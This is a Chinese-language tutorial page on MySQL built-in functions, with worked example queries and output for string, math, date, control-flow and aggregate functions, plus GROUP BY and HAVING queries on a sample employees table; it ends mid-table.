<h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><h5 id="概念-将一组逻辑语句封装在方法体中，对外暴露方法名"><a href="#概念-将一组逻辑语句封装在方法体中，对外暴露方法名" class="headerlink" title="概念:将一组逻辑语句封装在方法体中，对外暴露方法名"></a>概念:将一组逻辑语句封装在方法体中，对外暴露方法名</h5><h5 id="好处-1、隐藏了函数实现细节-2、提高了代码的重用性"><a href="#好处-1、隐藏了函数实现细节-2、提高了代码的重用性" class="headerlink" title="好处:1、隐藏了函数实现细节    2、提高了代码的重用性"></a>好处:1、隐藏了函数实现细节    2、提高了代码的重用性</h5><h5 id="调用-select-函数名-实参列表-【form-表】"><a href="#调用-select-函数名-实参列表-【form-表】" class="headerlink" title="调用: select 函数名(实参列表) 【form 表】;"></a>调用: select 函数名(实参列表) 【form 表】;</h5><h5 id="特点-2"><a href="#特点-2" class="headerlink" title="特点:"></a>特点:</h5><h5 id="函数名"><a href="#函数名" class="headerlink" title="函数名"></a>函数名</h5><h5 id="函数功能"><a href="#函数功能" class="headerlink" title="函数功能"></a>函数功能</h5><h5 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h5><h5 id="1、单行函数"><a href="#1、单行函数" class="headerlink" title="1、单行函数"></a>1、单行函数</h5><h5 id="如-concat、length、ifnull等"><a href="#如-concat、length、ifnull等" class="headerlink" title="如: concat、length、ifnull等"></a>如: concat、length、ifnull等</h5><h5 id="2、分组函数"><a href="#2、分组函数" class="headerlink" title="2、分组函数"></a>2、分组函数</h5><h5 id="功能：做统计使用，又称为统计函数、聚合函数、组函数"><a href="#功能：做统计使用，又称为统计函数、聚合函数、组函数" class="headerlink" title="功能：做统计使用，又称为统计函数、聚合函数、组函数"></a>功能：做统计使用，又称为统计函数、聚合函数、组函数</h5><h3 id="单行函数"><a href="#单行函数" class="headerlink" title="单行函数"></a>单行函数</h3><h4 id="单行函数-1"><a href="#单行函数-1" class="headerlink" title="单行函数:"></a>单行函数:</h4><ul>
<li><h5 id="字符函数"><a href="#字符函数" class="headerlink" title="字符函数"></a>字符函数</h5></li>
<li><h5 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h5></li>
<li><h5 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h5></li>
<li><h5 id="其他函数【补充】"><a href="#其他函数【补充】" class="headerlink" title="其他函数【补充】"></a>其他函数【补充】</h5></li>
<li><h5 id="流程控制函数【补充】"><a href="#流程控制函数【补充】" class="headerlink" title="流程控制函数【补充】"></a>流程控制函数【补充】</h5></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">单行函数</span><br><span class="line">总结:</span><br><span class="line">	字符函数:</span><br><span class="line">	length (获取字节长度)</span><br><span class="line">	concat(拼接字符)</span><br><span class="line">	upper(将字母大写)</span><br><span class="line">	lower(将字母小写)</span><br><span class="line">	substr(索引)</span><br><span class="line">	instr(返回第一次索引的位置)</span><br><span class="line">	trim(去除开头和结尾)</span><br><span class="line">	lpad(用指定字符实现左填充)</span><br><span class="line">	rpad(用指定字符实现右填充)</span><br><span class="line">	replace(替换)</span><br><span class="line">数学函数:</span><br><span class="line">	round(四舍五入)</span><br><span class="line">	ceil(向上取整)</span><br><span class="line">	floor(向下取整)</span><br><span class="line">	truncate(截断)</span><br><span class="line">	mod(取余)</span><br><span class="line">	rand(获取随机数)，返回0-1之间的小数，无限接近于1但到不了1</span><br><span class="line">日期函数:</span><br><span class="line">	now(返回当前日期和时间)</span><br><span class="line">	curdate(返回当前日期)</span><br><span class="line">	curtime(返回当前时间)</span><br><span class="line">	year(年)</span><br><span class="line">	month(月)</span><br><span class="line">	day(日)</span><br><span class="line">	hour(小时)</span><br><span class="line">	minute(分钟)</span><br><span class="line">	second(秒)</span><br><span class="line">	str_to_date(将字符通过指定的格式转换成日期)</span><br><span class="line">	date_format(将日期转换成字符)</span><br><span class="line">	ditediff(两个日期相差的天数)</span><br><span class="line">	monthname(以英文形式返回月)</span><br><span class="line">其他函数:</span><br><span class="line">	version(查看当前系统版本)</span><br><span class="line">	datebase(查看当前库名)</span><br><span class="line">	user(查看当前用户)</span><br><span class="line">	password(&#39;字符&#39;):返回该字符的密码形式，也就是自动加密</span><br><span class="line">	md5(&#39;字符&#39;):返回md5加密形式</span><br><span class="line">流程控制函数：</span><br><span class="line">	if(类似于if else)</span><br><span class="line">	case(类似于 swith default)</span><br></pre></td></tr></table></figure>



<h5 id="一、字符函数"><a href="#一、字符函数" class="headerlink" title="一、字符函数"></a>一、字符函数</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、length 获取参数值的字节个数</span><br><span class="line">mysql&gt; SELECT LENGTH(&#39;john&#39;);</span><br><span class="line"></span><br><span class="line">2、concat 拼接字符串</span><br><span class="line">mysql&gt; SELECT CONCAT(last_name,&#39;_&#39;,first_name) FROM employees;</span><br><span class="line"></span><br><span class="line">3、upper、lower  upper将想写变成大写，lower是将大写变成小写</span><br><span class="line">mysql&gt; SELECT UPPER(&#39;joke&#39;);</span><br><span class="line">mysql&gt; SELECT LOWER(&#39;jokE&#39;);</span><br><span class="line">示例:将姓大写，名小写，然后拼接</span><br><span class="line">mysql</span><br><span class="line">&gt; SELECT CONCAT(UPPER(last_name),LOWER(first_name)) 姓名 FROM employees;</span><br><span class="line"></span><br><span class="line">4、substr、substring	索引</span><br><span class="line">注意:索引是从1开始的，截取指定索引处后面所有的字符</span><br><span class="line">mysql&gt; SELECT SUBSTR(&#39;世间美好与你环环相扣&#39;,5) out_put;</span><br><span class="line"></span><br><span class="line">截取从指定索引处指定字符长度的字符</span><br><span class="line">mysql&gt; SELECT SUBSTR(&#39;世间美好与你环环相扣&#39;，1,4) out_put;</span><br><span class="line"></span><br><span class="line">案例:姓名中首字符大写，其他字符小写，然后用_拼接，显示出来</span><br><span class="line">mysql&gt; SELECT CONCAT(UPPER(SUBSTR(last_name,1,1)),&#39;_&#39;,LOWER(SUBSTR(last_name,2))) out_put FROM employees;</span><br><span class="line"></span><br><span class="line">5、instr	返回子串第一次出现的索引，如果找不到返回0</span><br><span class="line">mysql&gt; SELECT INSTR(&#39;杨过和小龙女&#39;,&#39;小龙女&#39;) out_put;</span><br><span class="line">+---------+</span><br><span class="line">| out_put |</span><br><span class="line">+---------+</span><br><span class="line">|       4 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">6、trim</span><br><span class="line">注意:trim只能去除开头和结尾，中间不能去除</span><br><span class="line">mysql&gt; SELECT TRIM(&#39;     皮卡丘     &#39;) out_put;</span><br><span class="line">+---------+</span><br><span class="line">| out_put |</span><br><span class="line">+---------+</span><br><span class="line">| 皮卡丘       |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">#可以加上length来查看字符长度，看看是否将空格去除了</span><br><span class="line">mysql&gt; SELECT LENGTH(TRIM(&#39;      皮卡丘      &#39;)) out_put;</span><br><span class="line">+---------+</span><br><span class="line">| out_put |</span><br><span class="line">+---------+</span><br><span class="line">|       6 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">案例一、aaaaaaa皮卡丘aaaaaaaa将a去除，只显示皮卡丘</span><br><span class="line"># 只需要在前面加上你想要去掉的符号就可以</span><br><span class="line">mysql&gt; SELECT TRIM(&#39;a&#39; FROM &#39;aaaaaaa皮卡丘aaaaaaaa&#39;) out_put;</span><br><span class="line">+---------+</span><br><span class="line">| out_put |</span><br><span class="line">+---------+</span><br><span class="line">| 皮卡丘       |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">7、lpad  用指定字符实现左填充指定长度</span><br><span class="line">mysql&gt; SELECT LPAD(&#39;小智&#39;,10,&#39;*&#39;) out_put;</span><br><span class="line">+--------------+</span><br><span class="line">| out_put      |</span><br><span class="line">+--------------+</span><br><span class="line">| ********小智    |</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line">8、rpad  用指定字符实现右填充指定长度</span><br><span class="line">mysql&gt; SELECT RPAD(&#39;小智&#39;,10,&#39;*&#39;) out_put;</span><br><span class="line">+--------------+</span><br><span class="line">| out_put      |</span><br><span class="line">+--------------+</span><br><span class="line">| 小智********    |</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line">9、replace  替换</span><br><span class="line">#将周芷若替换成了赵敏</span><br><span class="line">mysql&gt; SELECT REPLACE(&#39;张无忌爱上了周芷若&#39;,&#39;周芷若&#39;,&#39;赵敏&#39;) AS out_put;</span><br><span class="line">+------------------+</span><br><span class="line">| out_put          |</span><br><span class="line">+------------------+</span><br><span class="line">| 张无忌爱上了赵敏               |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>

<h5 id="二、数学函数"><a href="#二、数学函数" class="headerlink" title="二、数学函数"></a>二、数学函数</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、round  四舍五入</span><br><span class="line">mysql&gt; SELECT ROUND(4.6) number;</span><br><span class="line"></span><br><span class="line">2、ceil  向上取整，返回&gt;&#x3D;该参数的最小整数</span><br><span class="line">mysql&gt; SELECT CEIL(1.0000002) AS number;</span><br><span class="line">+--------+</span><br><span class="line">| number |</span><br><span class="line">+--------+</span><br><span class="line">|      2 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">3、floor  向下取整，返回&lt;&#x3D;该参数的最大整数</span><br><span class="line">mysql&gt; SELECT FLOOR(1.0000002) AS number;</span><br><span class="line">+--------+</span><br><span class="line">| number |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">4、truncate  截断</span><br><span class="line"># 4 表示保留小数点后几位</span><br><span class="line">mysql&gt; SELECT TRUNCATE(3.1415926,4) AS number;</span><br><span class="line">+--------+</span><br><span class="line">| number |</span><br><span class="line">+--------+</span><br><span class="line">| 3.1415 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">5、mod  取余</span><br><span class="line">mysql&gt; SELECT MOD(10,8) AS number;</span><br><span class="line">+--------+</span><br><span class="line">| number |</span><br><span class="line">+--------+</span><br><span class="line">|      2 |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure>

<h5 id="三、日期函数"><a href="#三、日期函数" class="headerlink" title="三、日期函数"></a>三、日期函数</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、now 返回当前系统+日期</span><br><span class="line">mysql&gt; SELECT NOW();</span><br><span class="line">+---------------------+</span><br><span class="line">| NOW()               |</span><br><span class="line">+---------------------+</span><br><span class="line">| 2020-02-05 15:09:28 |</span><br><span class="line">+---------------------+</span><br><span class="line"></span><br><span class="line">2、curdate  放回当前系统日期，不包含时间</span><br><span class="line">mysql&gt; SELECT CURDATE();</span><br><span class="line">+------------+</span><br><span class="line">| CURDATE()  |</span><br><span class="line">+------------+</span><br><span class="line">| 2020-02-05 |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line">3、curtime 返回当前系统时间，不包含日期</span><br><span class="line">mysql&gt; SELECT CURTIME();</span><br><span class="line">+-----------+</span><br><span class="line">| CURTIME() |</span><br><span class="line">+-----------+</span><br><span class="line">| 15:21:07  |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">4、可以获取指定的部分，年、月、日、小时、分钟、秒</span><br><span class="line"># 年(year)、月(month)、日(day)、小时(hour)、分钟(Minute)、秒(second)</span><br><span class="line">mysql&gt; SELECT YEAR(NOW());</span><br><span class="line">+-------------+</span><br><span class="line">| YEAR(NOW()) |</span><br><span class="line">+-------------+</span><br><span class="line">|        2020 |</span><br><span class="line">+-------------+</span><br><span class="line"></span><br><span class="line">5、str_to_date 将字符通过指定的格式转换成日期</span><br><span class="line">mysql&gt; SELECT STR_TO_DATE(&#39;2020-23-2&#39;,&#39;%Y-%d-%c&#39;);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| STR_TO_DATE(&#39;2020-23-2&#39;,&#39;%Y-%d-%c&#39;) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| 2020-02-23                          |</span><br><span class="line">+-------------------------------------+</span><br><span class="line"></span><br><span class="line">案例一:查询入职时间为1992-4-3的员工信息</span><br><span class="line">mysql&gt; SELECT hiredate FROM employees WHERE hiredate &#x3D; STR_TO_DATE(&#39;4-3-1992&#39;,&#39;%c-%d-%Y&#39;);</span><br><span class="line">+---------------------+</span><br><span class="line">| hiredate            |</span><br><span class="line">+---------------------+</span><br><span class="line">| 1992-04-03 00:00:00 |</span><br><span class="line">| 1992-04-03 00:00:00 |</span><br><span class="line">| 1992-04-03 00:00:00 |</span><br><span class="line">| 1992-04-03 00:00:00 |</span><br><span class="line">| 1992-04-03 00:00:00 |</span><br><span class="line">+---------------------+</span><br><span class="line"></span><br><span class="line">date_format:将日期转换成字符</span><br><span class="line">mysql&gt; SELECT DATE_FORMAT(&#39;2020&#x2F;2&#x2F;5&#39;,&#39;%Y年%m月%d日&#39;);</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| DATE_FORMAT(&#39;2020&#x2F;2&#x2F;5&#39;,&#39;%Y年%m月%d日&#39;)       |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| 2020年02月05日                               |</span><br><span class="line">+----------------------------------------+</span><br><span class="line"></span><br><span class="line">案例一:查询有奖金的员工名和入职日期(××月&#x2F;××日 ××年)</span><br><span class="line">mysql&gt; SELECT last_name,DATE_FORMAT(hiredate,&#39;%m月%d日 %y年&#39;) FROM employees WHERE commission_pct IS NOT NULL;</span><br><span class="line">+------------+---------------------------------------+</span><br><span class="line">| last_name  | DATE_FORMAT(hiredate,&#39;%m月%d日 %y年&#39;)       |</span><br><span class="line">+------------+---------------------------------------+</span><br><span class="line">| Russell    | 12月23日 02年                               |</span><br><span class="line">| Partners   | 12月23日 02年                               |</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1581511994303.png" alt="1580887767466"></p>
<h5 id="四、其他函数"><a href="#四、其他函数" class="headerlink" title="四、其他函数"></a>四、其他函数</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select version();  查看当前版本</span><br><span class="line">select datebase(); 查看当前数据库</span><br><span class="line">select user();  代表当前用户</span><br></pre></td></tr></table></figure>

<h5 id="五、流程控制函数"><a href="#五、流程控制函数" class="headerlink" title="五、流程控制函数"></a>五、流程控制函数</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、if函数: 类似于 if else 的效果</span><br><span class="line"></span><br><span class="line">#括号里面的数值，第一个是条件表达式，如果条件成立输出第二个，如果不成立，输出第三个</span><br><span class="line">10&gt;2成立，输出  大 </span><br><span class="line">mysql&gt; select if(10&gt;2,&#39;大&#39;,&#39;小&#39;);</span><br><span class="line"># 10&lt;2条件不成立，输出 小</span><br><span class="line">mysql&gt; select if(10&lt;2,&#39;大&#39;,&#39;小&#39;);</span><br><span class="line"></span><br><span class="line">案例一:将有奖金的员工名打印有，没有奖金的打印无</span><br><span class="line">mysql&gt; select last_name,commission_pct,if(commission_pct is null,&#39;无&#39;,&#39;有&#39;) 奖金 from employees;</span><br><span class="line"></span><br><span class="line">2、case函数的使用方法一	大部分用于等值判断</span><br><span class="line">在when中值不需要加;分号，语句需要加;分号</span><br><span class="line">&#x2F;*</span><br><span class="line">语法:</span><br><span class="line">    case 要判断的字段或表达式</span><br><span class="line">    when 常量1 then 要显示的值1或语句1;</span><br><span class="line">    when 常量2 then 要显示的值2或语句2;</span><br><span class="line">    ...</span><br><span class="line">    else 要显示的值n或语句n;</span><br><span class="line">    end</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">案例:查询员工的工资，要求:</span><br><span class="line">部门号&#x3D;30，显示工资1.1倍</span><br><span class="line">部门号&#x3D;40，显示工资1.2倍</span><br><span class="line">部门号&#x3D;50，显示工资1.3倍</span><br><span class="line">其他部门，显示工资为原工资</span><br><span class="line">mysql&gt; select salary,department_id,</span><br><span class="line">    -&gt; case department_id</span><br><span class="line">    -&gt; when 30 then salary*1.1</span><br><span class="line">    -&gt; when 40 then salary*1.2</span><br><span class="line">    -&gt; when 50 then salary*1.3</span><br><span class="line">    -&gt; else salary</span><br><span class="line">    -&gt; end as 新工资</span><br><span class="line">    -&gt; from employees;</span><br><span class="line">+----------+---------------+----------+</span><br><span class="line">| salary   | department_id | 新工资        |</span><br><span class="line">+----------+---------------+----------+</span><br><span class="line">| 24000.00 |            90 | 24000.00 |</span><br><span class="line">| 17000.00 |            90 | 17000.00 |</span><br><span class="line">| 17000.00 |            90 | 17000.00 |</span><br><span class="line">|  9000.00 |            60 |  9000.00 |</span><br><span class="line">|  6000.00 |            60 |  6000.00 |</span><br><span class="line"></span><br><span class="line">3、case 函数的使用二	大部分用于判断大于小于</span><br><span class="line">&#x2F;*</span><br><span class="line">语法:</span><br><span class="line">    case </span><br><span class="line">    when 条件1 then 要显示的值1</span><br><span class="line">    when 条件2 then 要显示的值2</span><br><span class="line">    ...</span><br><span class="line">    else 要显示的值n或语句n;</span><br><span class="line">    end</span><br><span class="line">*&#x2F;</span><br><span class="line">案例一:查询员工的工资情况</span><br><span class="line">如果工资&gt;20000,显示A级别</span><br><span class="line">如果工资&gt;15000,显示B级别</span><br><span class="line">如果工资&gt;10000,显示C级别</span><br><span class="line">其他显示D级别</span><br><span class="line">mysql&gt; select salary,</span><br><span class="line">    -&gt; case</span><br><span class="line">    -&gt; when salary&gt;20000 then &#39;A&#39;</span><br><span class="line">    -&gt; when salary&gt;15000 then &#39;B&#39;</span><br><span class="line">    -&gt; when salary&gt;10000 then &#39;C&#39;</span><br><span class="line">    -&gt; else &#39;D&#39;</span><br><span class="line">    -&gt; end as 工资级别</span><br><span class="line">    -&gt; from employees;</span><br><span class="line">+----------+----------+</span><br><span class="line">| salary   | 工资级别        |</span><br><span class="line">+----------+----------+</span><br><span class="line">| 24000.00 | A        |</span><br><span class="line">| 17000.00 | B        |</span><br><span class="line">|  9000.00 | D        |</span><br><span class="line">| 12000.00 | C        |</span><br></pre></td></tr></table></figure>

<h4 id="分组函数"><a href="#分组函数" class="headerlink" title="分组函数"></a>分组函数</h4><h5 id="功能-用作统计使用，又成为聚合函数或统计函数或组函数"><a href="#功能-用作统计使用，又成为聚合函数或统计函数或组函数" class="headerlink" title="功能:用作统计使用，又成为聚合函数或统计函数或组函数"></a>功能:用作统计使用，又成为聚合函数或统计函数或组函数</h5><h5 id="分类-1"><a href="#分类-1" class="headerlink" title="分类:"></a>分类:</h5><h5 id="sum-求和、avg-平均值、max-最大值、min-最小值、count-计算个数"><a href="#sum-求和、avg-平均值、max-最大值、min-最小值、count-计算个数" class="headerlink" title="sum 求和、avg 平均值、max 最大值、min 最小值、count 计算个数"></a>sum 求和、avg 平均值、max 最大值、min 最小值、count 计算个数</h5><h5 id="特点-3"><a href="#特点-3" class="headerlink" title="特点:"></a>特点:</h5><h5 id="1、sum、avg-一般用于处理数值型"><a href="#1、sum、avg-一般用于处理数值型" class="headerlink" title="1、sum、avg 一般用于处理数值型"></a>1、sum、avg 一般用于处理数值型</h5><h5 id="max、min、count可以处理任何类型"><a href="#max、min、count可以处理任何类型" class="headerlink" title="max、min、count可以处理任何类型"></a>max、min、count可以处理任何类型</h5><h5 id="2、以上分组函数都忽略null值"><a href="#2、以上分组函数都忽略null值" class="headerlink" title="2、以上分组函数都忽略null值"></a>2、以上分组函数都忽略null值</h5><h5 id="3、可以和distinct搭配是去重运算-select-sum-distinct-字段-from-表"><a href="#3、可以和distinct搭配是去重运算-select-sum-distinct-字段-from-表" class="headerlink" title="3、可以和distinct搭配是去重运算      select sum(distinct 字段) from 表"></a>3、可以和distinct搭配是去重运算      select sum(distinct 字段) from 表</h5><h5 id="4、count函数的单独介绍，一般使用count-用作统计行数"><a href="#4、count函数的单独介绍，一般使用count-用作统计行数" class="headerlink" title="4、count函数的单独介绍，一般使用count()用作统计行数"></a>4、count函数的单独介绍，一般使用count()用作统计行数</h5><h5 id="5、和分组函数一同查询的字段要求是group-by后的字段"><a href="#5、和分组函数一同查询的字段要求是group-by后的字段" class="headerlink" title="5、和分组函数一同查询的字段要求是group by后的字段"></a>5、和分组函数一同查询的字段要求是group by后的字段</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、简单的使用</span><br><span class="line">mysql&gt; select sum(salary) from employees; #salary的全部和</span><br><span class="line">mysql&gt; select avg(salary) from employees; #salary的平均值</span><br><span class="line">mysql&gt; select max(salary) from employees; #salary的最大值</span><br><span class="line">mysql&gt; select min(salary) from employees; #salary的最小值</span><br><span class="line">mysql&gt; select count(salary) from employees; #计算有多少个salary</span><br><span class="line"></span><br><span class="line">可以将函数一起使用</span><br><span class="line">mysql&gt; select sum(salary) 和,avg(salary) 平均,max(salary) 最大,min(salary) 最小,count(salary) 个数 from employees;</span><br><span class="line"></span><br><span class="line">2、参数支持那些类型</span><br><span class="line">sum、avg一般用于处理数值型</span><br><span class="line">max、min、count可以处理任何类型</span><br><span class="line">   </span><br><span class="line">mysql&gt; select sum(salary),avg(salary) from employees;</span><br><span class="line">mysql&gt; select max(last_name),min(salary),count(last_name) from employees;</span><br><span class="line"></span><br><span class="line">3、是否忽略null值</span><br><span class="line">以上分组函数都忽略null值</span><br><span class="line">mysql&gt; select sum(commission_pct),avg(commission_pct) from employees;</span><br><span class="line">mysql&gt; select max(commission_pct),min(commission_pct) from employees;</span><br><span class="line">mysql&gt; select count(commission_pct) from employees;</span><br><span class="line"></span><br><span class="line">4、和distinct的搭配</span><br><span class="line">其他分组函数全都支持distinct去重</span><br><span class="line">mysql&gt; select sum(distinct salary),sum(salary) from employees;</span><br><span class="line">+----------------------+-------------+</span><br><span class="line">| sum(distinct salary) | sum(salary) |</span><br><span class="line">+----------------------+-------------+</span><br><span class="line">|            397900.00 |   691400.00 |</span><br><span class="line">+----------------------+-------------+</span><br><span class="line"></span><br><span class="line">计算有几个工资，去重之后是57个原始的个数是107个</span><br><span class="line">mysql&gt; select count(distinct salary),count(salary) from employees;</span><br><span class="line">+------------------------+---------------+</span><br><span class="line">| count(distinct salary) | count(salary) |</span><br><span class="line">+------------------------+---------------+</span><br><span class="line">|                     57 |           107 |</span><br><span class="line">+------------------------+---------------+</span><br><span class="line"></span><br><span class="line">5、count函数详细介绍</span><br><span class="line">#统计行数也就是个数</span><br><span class="line">mysql&gt; select count(*) from employees;</span><br><span class="line">#和以上方法意思相同</span><br><span class="line">mysql&gt; select count(1) from employees;</span><br><span class="line"></span><br><span class="line">效率:</span><br><span class="line">5.5版本之前用myisam存储引擎下，count(*)的效率高</span><br><span class="line">5.5版本之后用innodb存储引擎下，count(*)和count(1)效率差不多，但比count(字段)要高，如果里面加字段，他会进行一个判断，判断是否为null如果为null不加1</span><br><span class="line"></span><br><span class="line">6、和分组函数一同查询的字段有限制</span><br><span class="line">#虽然语法没报错但是它的employee_id是错误的</span><br><span class="line">mysql&gt; select avg(salary),employee_id from employees;</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| avg(salary) | employee_id |</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| 6461.682243 |         100 |</span><br><span class="line">+-------------+-------------+</span><br></pre></td></tr></table></figure>

<h4 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">特点：</span><br><span class="line">	1、分组查询中的筛选条件分为两类</span><br><span class="line"> 	分组前筛选	原始表		它的位置是在group by 子句的前面		关键字是where</span><br><span class="line"> 	分组后筛选	分组后的结果集		它的位置是在group by 子句的后面	关键字是having</span><br><span class="line"> 		①分组函数做条件一定是放在having子句中</span><br><span class="line"> 		②能用分组前筛选的，就优先考虑使用分组前筛选</span><br><span class="line"> 2、group by子句支持单个字段分组、多个字段分组(多个字段之间用&quot;,&quot;逗号隔开没有顺寻要求)，表达式或函数(用得较少)</span><br><span class="line"> 3、也可以添加排序(排序放在整个分段查询的最后)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">​	select 分组函数,字段(要求出现在group by的后面)</span><br><span class="line">​	from 表名</span><br><span class="line">​	【where 筛选条件】</span><br><span class="line">​	group by 分组的列表</span><br><span class="line">​	【order by 子句】</span><br><span class="line"></span><br><span class="line">注意:  370</span><br><span class="line">	查询列表必须特殊，要求是分组函数和group by后出现的字段</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">简单的分组查询</span><br><span class="line"></span><br><span class="line">案例一:查询每个工种的最高工资</span><br><span class="line">mysql&gt; select max(salary),job_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by job_id;</span><br><span class="line">    </span><br><span class="line">案例二:查询每个位置上的部门个数</span><br><span class="line">mysql&gt; select count(*),location_id</span><br><span class="line">    -&gt; from departments</span><br><span class="line">    -&gt; group by location_id;</span><br><span class="line">    </span><br><span class="line">添加分组前的筛选条件</span><br><span class="line">案例一: 查询邮箱中包含a字符的，每个部门的平均工资</span><br><span class="line">mysql&gt; select avg(salary),department_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where email like &#39;%a%&#39;</span><br><span class="line">    -&gt; group by department_id;</span><br><span class="line"></span><br><span class="line">案例二:查询有奖金的每个领导手下员工的最高工资</span><br><span class="line">mysql&gt; select max(salary),manager_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where commission_pct is not null</span><br><span class="line">    -&gt; group by manager_id;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">添加分组后的的筛选条件</span><br><span class="line">案例一:查询哪个部门的员工表个数&gt;2</span><br><span class="line">mysql&gt; select count(*),department_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by department_id</span><br><span class="line">    -&gt; having count(*)&gt;2;</span><br><span class="line">+----------+---------------+</span><br><span class="line">| count(*) | department_id |</span><br><span class="line">+----------+---------------+</span><br><span class="line">|        6 |            30 |</span><br><span class="line">|       45 |            50 |</span><br><span class="line">|        5 |            60 |</span><br><span class="line">|       34 |            80 |</span><br><span class="line">|        3 |            90 |</span><br><span class="line">|        6 |           100 |</span><br><span class="line">+----------+---------------+  </span><br><span class="line"></span><br><span class="line">案例二:查询每个工种有奖金的员工的最高工资&gt;12000的工种编号和最高工资</span><br><span class="line">mysql&gt; select max(salary),job_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where commission_pct is not null</span><br><span class="line">    -&gt; group by job_id</span><br><span class="line">    -&gt; having max(salary)&gt;12000;</span><br><span class="line">+-------------+--------+</span><br><span class="line">| max(salary) | job_id |</span><br><span class="line">+-------------+--------+</span><br><span class="line">|    14000.00 | SA_MAN |</span><br><span class="line">+-------------+--------+</span><br><span class="line"></span><br><span class="line">案例三:查询领导编号&gt;102的每个领导手下的最低工资&gt;5000的领导编号是那个，以及其最低工资</span><br><span class="line">mysql&gt; select min(salary),manager_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where manager_id&gt;102</span><br><span class="line">    -&gt; group by manager_id</span><br><span class="line">    -&gt; having min(salary)&gt;5000;</span><br><span class="line">+-------------+------------+</span><br><span class="line">| min(salary) | manager_id |</span><br><span class="line">+-------------+------------+</span><br><span class="line">|     6900.00 |        108 |</span><br><span class="line">|     7000.00 |        145 |</span><br><span class="line">|     7000.00 |        146 |</span><br><span class="line">|     6200.00 |        147 |</span><br><span class="line">|     6100.00 |        148 |</span><br><span class="line">|     6200.00 |        149 |</span><br><span class="line">|     6000.00 |        201 |</span><br><span class="line">|     8300.00 |        205 |</span><br><span class="line">+-------------+------------+</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">按表达式或函数分组</span><br><span class="line"></span><br><span class="line">案例:员工姓名的长度分组，查询每一组的员工个数，筛选员工个数大于5的有哪些</span><br><span class="line">mysql&gt; select count(*),length(last_name)</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by length(last_name)</span><br><span class="line">    -&gt; having count(*)&gt;5;    </span><br><span class="line">+----------+-------------------+</span><br><span class="line">| count(*) | length(last_name) |</span><br><span class="line">+----------+-------------------+</span><br><span class="line">|       11 |                 4 |</span><br><span class="line">|       29 |                 5 |</span><br><span class="line">|       28 |                 6 |</span><br><span class="line">|       15 |                 7 |</span><br><span class="line">|        7 |                 8 |</span><br><span class="line">|        8 |                 9 |</span><br><span class="line">+----------+-------------------+</span><br><span class="line">按多个字段分组</span><br><span class="line">案例:查询每个部门每个工种的员工的平均工资</span><br><span class="line">mysql&gt; select avg(salary),department_id,job_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by department_id,job_id;</span><br><span class="line">+--------------+---------------+------------+</span><br><span class="line">| avg(salary)  | department_id | job_id     |</span><br><span class="line">+--------------+---------------+------------+</span><br><span class="line">|  7000.000000 |          NULL | SA_REP     |</span><br><span class="line">|  4400.000000 |            10 | AD_ASST    |</span><br><span class="line">| 13000.000000 |            20 | MK_MAN     |</span><br><span class="line">    </span><br><span class="line">添加排序</span><br><span class="line">案例:查询每个部门每个工种的员工的平均工资，并且按平均工资的高低显示</span><br><span class="line">mysql&gt; select avg(salary),department_id,job_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by department_id,job_id</span><br><span class="line">    -&gt; order by avg(salary) desc;</span><br><span class="line">+--------------+---------------+------------+</span><br><span class="line">| avg(salary)  | department_id | job_id     |</span><br><span class="line">+--------------+---------------+------------+</span><br><span class="line">| 24000.000000 |            90 | AD_PRES    |</span><br><span class="line">| 17000.000000 |            90 | AD_VP      |</span><br><span 